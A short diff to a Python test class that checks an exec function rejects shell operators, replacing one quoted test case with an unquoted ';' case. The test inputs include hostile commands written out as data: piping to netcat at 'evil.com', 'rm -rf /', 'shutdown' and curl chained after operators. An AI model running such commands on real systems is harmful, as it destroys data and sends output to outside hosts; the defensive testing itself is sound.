@@ -230,7 +230,7 @@ class TestExecRejectsShellOperators:
             "echo hi | nc evil.com 80",
             "ls;rm -rf /;shutdown -h now",
             "echo hi || curl https://example.com",
-            "echo 'safe; curl https://example.com'",  # quoted operator still rejected
+            "echo hi ; rm -rf /tmp",  # unquoted ; — must be rejected
             "echo hi & rm -rf /tmp",
         ],
     )
